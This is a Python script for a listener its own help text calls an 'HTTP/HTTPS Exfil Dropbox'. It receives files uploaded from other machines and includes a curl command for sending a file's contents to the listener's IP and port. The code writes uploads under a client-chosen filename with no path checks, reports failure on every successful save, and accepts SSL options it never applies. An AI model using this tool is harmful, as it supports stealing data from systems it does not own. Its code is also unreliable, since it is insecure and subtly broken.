from http.server import BaseHTTPRequestHandler, HTTPServer
import re
import os
import argparse

def getFile(rfile, length):
  fileMetaData = {'filename':''}
  fileData = []
  fileDataFlag = False

  data = []
  chunk = bytearray()

  chunk_size = 1

  for i in range(int(length)):
    temp = rfile.read(chunk_size)
    chunk += temp
    if temp == b'\n':
      data.append(chunk)
      chunk = bytearray()
      
  try:
    fileMetaData['filename'] = re.findall('filename="(.+)"',data[1].decode())[0]
  except IndexError:
    print('No filename found. No file to be saved.')
    return (None, None)
    
  for line in data:
    if b'\r\n' == line:
      fileDataFlag = not fileDataFlag
      continue
    
    if fileDataFlag:
      if b'\r\n' == line[-2:]:
        line = line[0:len(line)-2]
        fileDataFlag = not fileDataFlag
      fileData.append(bytes(line))

  return (fileMetaData, fileData)

def saveFile(fileMetaData, fileData):
  with open(fileMetaData['filename'], 'wb') as FILE:
    FILE.write(b''.join(fileData))
  FILE.close()
  print(f'File saved as {fileMetaData["filename"]}\n')

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
  HTML_PATH = None

  def clientInfo(self):
    print(self.requestline)
    print(f'User-Agent: {self.headers["User-Agent"]}\nContent-Length: {self.headers["Content-Length"]}\nContent-Type: {self.headers["Content-Type"]}\n')

  def serveHTML(self):
    with open(self.HTML_PATH) as f:
      self.send_response(200)
      self.send_header('Content-type', 'text/html')
      self.end_headers()
      self.wfile.write(f.read().encode())

  def do_POST(self):
    client = self.client_address
    print(f'\nRequest from {client[0]} {client[1]}:')
    self.clientInfo()
    (fileMetaData, fileData) = getFile(self.rfile, self.headers['Content-Length'])

    if (fileMetaData == None and fileData == None) or (fileMetaData['filename'] == '' and fileData == []):
      self.send_response(500)
      self.end_headers()
    else:
      if saveFile(fileMetaData,fileData):
        self.send_response(200)
        self.end_headers()
        
      else:
        self.send_response(500)
        self.end_headers()
        

  def do_GET(self):
    client = self.client_address
    print(f'\nRequest from {client[0]} {client[1]}:')
    self.clientInfo()
    if self.HTML_PATH == None:
      self.HTML_PATH = os.getcwd()
      for index in "index.html", "index.htm":
        index = os.path.join(self.HTML_PATH,index)
        if os.path.exists(index):
          self.HTML_PATH = index
          break
    if 'index' in self.HTML_PATH and os.path.exists(self.HTML_PATH):
      self.serveHTML()

def createArgParser():
  parser = argparse.ArgumentParser(description='HTTP/HTTPS Exfil Dropbox.\nVisit the site or curl your file.\n(i.e. curl -F "data=@<path to file>" <IP of webserver>:<PORT of webserver>')
  parser.add_argument('--LHOST', help='The IP the http/https server will listen on.', default='0.0.0.0')
  parser.add_argument('--LPORT', type=int, help='The PORT the http/https server will listen on.', default='8000')
  parser.add_argument('--SSLKEYFILE', help='Path to the SSL key file.')
  parser.add_argument('--SSLCERTFILE', help='Path to the SSL cert file.')
  return parser

def main():
  parser = createArgParser()
  args = vars(parser.parse_args())
  LPORT = args['LPORT']
  LHOST = args['LHOST']
  server = HTTPServer((LHOST,LPORT), SimpleHTTPRequestHandler)
  print('Starting server...')
  print(f'Listening on http://{LHOST}:{LPORT}')
  server.serve_forever()

main()